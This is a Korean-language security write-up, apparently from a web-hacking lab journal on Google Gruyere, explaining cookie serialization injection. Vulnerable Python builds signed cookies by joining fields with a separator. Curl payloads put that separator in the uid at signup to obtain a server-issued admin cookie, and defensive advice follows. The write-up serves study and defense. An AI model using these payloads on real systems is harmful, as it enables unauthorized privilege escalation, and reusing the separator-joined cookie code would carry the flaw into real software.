# Cookie Serialization Injection — 서명이 있어도 안전하지 않은 이유

## 원리

쿠키에 상태(사용자 ID, 권한 플래그)를 담고 **서명으로 무결성을 보장**하는 구현은 흔하다.
그런데 서명은 "이 문자열이 내가 만든 것이다"만 보장하지, **그 문자열의 구조가 안전하다는
것은 보장하지 않는다.** 서명 대상 문자열을 조립할 때 사용자 입력이 **구분자와 함께**
그대로 들어가면, 검증을 통과한 데이터 안에 공격자가 **필드를 추가**할 수 있다.

전형적 실패 패턴 두 가지:

```python
# (1) 구분자 결합 + split 기반 파싱
c_data = '%s|%s|%s' % (uid, is_admin, is_author)     # uid 를 검증 없이 결합
h = str(hash(secret + c_data) & MASK)
cookie = '%s=%s|%s' % (name, h, c_data)

# 파싱
hashed, cookie_data = cookie.split('|', 1)
if hashed != str(hash(secret + cookie_data) & MASK): return NULL_COOKIE
values = cookie_data.split('|')
return {'uid': values[0], 'is_admin': values[1] == 'admin', 'is_author': values[2] == 'author'}
```

`uid` 에 구분자가 들어가면 필드가 밀려 권한 플래그가 공격자 의도대로 정해진다. 그리고
**서명은 그 uid 포함 전체 데이터로 정상 계산되므로 검증을 통과한다.**

## 케이스 A — 가입 폼 하나로 서버가 관리자 쿠키를 발급

공격자가 위조 코드를 짤 필요조차 없다. **서버가 스스로 발급**한다.

```bash
# uid 에 구분자를 URL 인코딩해 넣고 가입 (uid 중복 검사만 있고 문자 검증이 없는 앱)
curl -s -D - "https://<target>/<base>/saveprofile?action=new&uid=attacker%7Cadmin%7Cauthor&pw=<pw>"
#   → Set-Cookie: <COOKIENAME>=<sig>|attacker|admin|author||; path=/<base>
```

서버가 그 쿠키를 어떻게 해석하는지 **서버 자신에게 물어보는 것**이 가장 강한 증거다
(디버그 페이지, 프로필 표시, 응답에 반영되는 값 등).

```bash
curl -s -b "<COOKIENAME>=<sig>|attacker|admin|author||" "https://<target>/<base>/debug"
#   → {'is_admin': True, 'is_author': True, 'uid': u'attacker'}
curl -s -b "<COOKIENAME>=<sig>|attacker|admin|author||" "https://<target>/<base>/admin"
#   → 관리자 전용 메뉴/링크가 렌더됨 (비인증 요청과 본문 크기·내용을 대조)
```

**결정적 대비**: 저장소(DB) 상의 계정에는 관리자 권한이 **없다**(`is_admin=None`).
권한은 오직 쿠키 문자열 파싱에서 나온다 → "권한이 데이터가 아니라 직렬화 형식에 있다"는
증거가 되고, 보고서 심각도 산정이 명확해진다.

## 케이스 B — 같은 뿌리의 변형들

| 변형 | 확인 방법 |
|---|---|
| 구분자 외 특수문자(`%00`, 개행, 공백) | 서명 검증은 통과하지만 파싱이 달라지는지 |
| 필드 수 고정 가정 | `split(sep, 1)` vs `split(sep)` 의 차이로 필드가 밀리는지 |
| JSON 직렬화 + 서명 | 문자열 결합이 아니므로 보통 안전하지만 **타입 혼동**(문자열 `"admin"` vs 불리언) 확인 |

## 판정 기준 설계 (일반화 가능한 교훈)

가능하면 **"내가 위조한 값"이 아니라 "서버가 내준 원문"을 증거로** 쓴다.

- 위조 재현 → "위조가 가능하다"는 주장(시크릿을 이미 알고 있다는 전제가 필요할 수 있음)
- 서버 발급 쿠키 → **"서버가 스스로 권한을 부여한다"**는 더 강한 주장(시크릿 무관)

같은 원리로, 서명 알고리즘을 재현해 위조하는 방식보다 **서버가 발급한 쿠키를 그대로
되돌려 보내 서버의 해석을 확인**하는 편이 재현도 쉽고 임팩트 증명도 강하다.

## 확인된 사례

- 재확인된 사례: `google-gruyere-trial` (Round 9 — `uid` 에 `|` 를 넣어 가입 → 서버가
  `is_admin` 플래그가 실린 쿠키를 발급, DB 에는 권한 없음). Python2 `hash` 기반 서명.

## 방어 관점 메모

- 쿠키 등 직렬화된 상태는 **구조적 인코딩**(길이 접두, JSON, 또는 별도 필드) + **HMAC** 을
  쓴다. 구분자 기반 결합은 입력에 구분자가 있으면 무너진다.
- 근본적으로는 **권한 플래그를 클라이언트 상태에 두지 않고** 매 요청 서버 저장소에서
  조회한다(쿠키에는 불투명한 세션 식별자만).
- 가입/아이디 생성 시 허용 문자 집합을 강제한다(구분자·제어문자 거부).

<!-- 출처: journal/web/google-gruyere-trial/, Round 9 -->
